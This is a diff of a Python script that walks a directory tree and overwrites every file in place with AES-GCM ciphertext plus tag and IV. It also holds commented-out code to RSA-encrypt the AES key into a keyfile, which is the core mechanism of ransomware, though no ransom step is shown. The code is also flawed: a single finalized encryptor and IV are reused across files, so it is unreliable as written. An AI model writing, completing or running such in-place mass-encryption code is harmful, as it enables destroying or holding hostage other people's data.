@@ -35,11 +35,6 @@ def main():
 		backend=default_backend()
 	).encryptor()
 
-	message = b"Hello im bobby"
-	ciphertext = encryptor.update(message) + encryptor.finalize()
-	print(ciphertext)
-	print(encryptor.tag)
-
 	#Uses RSA to encrypt the AES key and store it in keyfile
 #	rsaKey = RSA.importKey(keyData)
 #	cipher = PKCS1_OAEP.new(rsaKey)
@@ -55,12 +50,17 @@ def main():
 
 	for root,dirs,files in os.walk(argv[2], topdown=True):
 		for name in files:
-			print(os.path.join(root,name))
+			filename = os.path.join(root,name)
+			fin = open(filename, "rb")
+			contents = fin.read()
+			fin.close()
+			fout = open(filename, "wb")
+			ciphertext = encryptor.update(contents) + encryptor.finalize()
+			fout.write(encryptor.tag)
+			fout.write(iv)
+			fout.write(ciphertext)
+			fout.close()
 			#Basically, open every file, read it all in, encrypt it, spit it back out with the tag and iv i guess?
-		for name in dirs:
-			print(os.path.join(root,name))
-	
-
 
 if __name__ == "__main__":
 	exit(main())
